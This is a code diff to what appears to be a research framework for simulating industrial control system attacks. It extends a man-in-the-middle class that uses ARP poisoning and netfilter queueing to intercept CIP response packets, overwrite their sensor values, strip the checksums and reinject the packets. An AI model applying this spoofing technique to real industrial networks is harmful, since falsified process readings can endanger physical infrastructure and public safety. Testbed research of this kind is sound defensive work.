@@ -7,7 +7,6 @@ import fnfqueue
 from scapy.layers.inet import IP, TCP
 from scapy.packet import Raw
 
-from dhalsim.network_attacks.cip.cip import CIP
 from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp, translate_payload_to_float, translate_float_to_payload
 from dhalsim.network_attacks.synced_attack import SyncedAttack
 
@@ -26,7 +25,6 @@ class PacketAttack(SyncedAttack):
         self.queue = fnfqueue.Connection()
         self.thread = None
         self.run_thread = False
-        # self.nfqueue = NetfilterQueue()
 
 
     def setup(self):
@@ -55,13 +53,31 @@ class PacketAttack(SyncedAttack):
             try:
                 for packet in self.queue:
                     # TODO The actual mitm stuff
-                    packet2 = IP(packet.payload)
+                    p = IP(packet.payload)
                     # Packets with 100 <= length < 116 are CIP response packets
-                    if 100 <= packet2[IP].len < 116:
-                        print("MITM 🖥️:", "CIP Response 📦:", "source:", packet2[IP].src.ljust(16),
-                              str(packet2[TCP].sport).ljust(6), "   destination:",
-                              packet2[IP].dst.ljust(16), str(packet2[TCP].dport).ljust(6), str(packet2[IP].len).ljust(6))
-                        print("MITM 🖥️:", "CIP Response 📦:", "Payload Value:", translate_payload_to_float(packet.payload))
+                    if 100 <= p[IP].len < 116:
+                        print("MITM 🖥️ -----------------------")
+                        print("MITM 🖥️:", "CIP Response 📦:", "source:", p[IP].src.ljust(16),
+                              str(p[TCP].sport).ljust(6), "   destination:",
+                              p[IP].dst.ljust(16), str(p[TCP].dport).ljust(6), str(p[IP].len).ljust(6))
+                        print("MITM 🖥️:", "Value:", translate_payload_to_float(p[Raw].load))
+                        print("MITM 🖥️:", "Old Load in HEX:", p[Raw].load.hex())
+                        print("MITM 🖥️:", "CIP Response 📦:", "Payload overwriting")
+                        # print("MITM 🖥️:", "Showing 📦:", packet2.show2())
+                        # print("MITM 🖥️:", "Showing1 📦:", p.show(dump=True))
+                        p[Raw].load = translate_float_to_payload(self.intermediate_attack['value'], p[Raw].load)
+                        print("MITM 🖥️:", "New Value:", translate_payload_to_float(p[Raw].load))
+                        print("MITM 🖥️:", "New Load in HEX:", p[Raw].load.hex())
+
+                        # p[Raw].load = p[Raw].load[:-2] + b'\x12\x34'
+                        del p[TCP].chksum
+                        del p[IP].chksum
+
+                        # print("MITM 🖥️:", "Showing2 📦:", p.show(dump=True))
+
+                        packet.payload = bytes(p)
+
+                        # packet.payload = translate_float_to_payload(self.intermediate_attack['value'], packet.payload)
 
                     packet.mangle()
 
@@ -82,7 +98,7 @@ class PacketAttack(SyncedAttack):
         os.system('iptables -D OUTPUT -p icmp -j DROP')
 
         restore_arp("192.168.1.1", "192.168.1.254")
-        restore_arp("192.168.1.254", "192.168.1.1")
+        # restore_arp("192.168.1.254", "192.168.1.1")
 
         self.run_thread = False
         self.queue.close()
